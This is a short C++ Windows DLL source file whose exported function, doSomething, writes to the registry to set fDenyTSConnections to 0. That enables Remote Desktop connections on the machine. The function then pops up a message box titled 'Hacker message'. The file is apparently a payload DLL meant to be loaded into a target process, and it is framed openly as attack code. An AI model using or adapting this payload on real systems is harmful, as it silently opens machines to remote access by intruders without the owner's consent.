// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <netfw.h>
#pragma comment( lib, "ole32.lib" )



extern "C" _declspec(dllexport)
void doSomething(void)
{



    DWORD value = 0;
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, TEXT("fDenyTSConnections"), 0, REG_DWORD, (const BYTE*)&value, sizeof(value));

    MessageBox(NULL, L"Hello hello!", L"Hacker message", NULL);
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

